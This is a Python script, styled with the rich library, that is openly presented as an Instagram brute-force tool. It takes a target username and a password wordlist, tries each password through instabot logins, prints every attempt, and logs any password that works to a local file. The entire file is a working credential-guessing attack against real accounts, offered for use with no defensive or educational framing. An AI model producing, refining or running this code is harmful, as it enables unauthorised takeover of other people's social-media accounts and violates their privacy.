import os
import time
import shutil
import logging
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

# Create Console for Stylish Input & Output
console = Console()

# Function to Install Missing Modules
def install(md):
    os.system(f"python3 -m pip install {md}")

# Install Necessary Modules
try:
    from instabot import Bot
except:
    console.print("[yellow bold]⚡ Installing required modules...[/yellow bold]")
    install("instabot-py")
    from instabot import Bot

# User Inputs (Only Stylish Part)
console.print(Panel("[bold cyan]🔥 Instagram Brute-Force Tool 🔥[/bold cyan]", title="[bold green]🔐 Welcome![/bold green]"))
user_name = Prompt.ask("[bold yellow]👤 Enter Instagram Username[/bold yellow]")
file_name = Prompt.ask("[bold magenta]📂 Enter Wordlist File Path[/bold magenta]")

# Count Total Passwords
try:
    with open(file_name, 'r') as f:
        passwords = f.readlines()
    total_passwords = len(passwords)
except FileNotFoundError:
    console.print(Panel("[red bold]❌ Error: Wordlist file not found![/red bold]", title="[yellow]⚠ Warning[/yellow]"))
    exit()

console.print(f"[cyan bold]🔢 Total Passwords to Try: {total_passwords}[/cyan bold]\n")

# Raw Code (Password Trying - No Styling)
def pass_crack(user_name, file_name):
    config_path = "config"
    if os.path.exists(config_path):
        shutil.rmtree(config_path)

    bot = Bot()

    try:
        with open(file_name, 'r') as f:
            passwords = f.readlines()
        
        for password in passwords:
            password = password.strip()
            print(f"Trying... password: {password}")  # RAW Output
            
            try:
                bot.login(username=user_name, password=password)
                if bot.api.is_logged_in:
                    os.system("clear")
                    console.print(Panel(f"[green bold]✅ Logged in successfully![/]\n[bold cyan]🔓 Password Found: {password}[/bold cyan]", title="[bold yellow]🎉 SUCCESS[/bold yellow]"))

                    # Save found password
                    with open("passwords_log.txt", 'a') as f:
                        f.write(f"{user_name} : {password}\n")
                    
                    return  # Stop brute-force when password is found
                
                bot.logout()
                time.sleep(3)  
            except:
                continue

    except Exception as e:
        if 'challenge_required' in str(e):
            print("Challenge required! Unable to continue.")
        else:
            print(f"Error occurred: {e}")

# Start Cracking
pass_crack(user_name, file_name)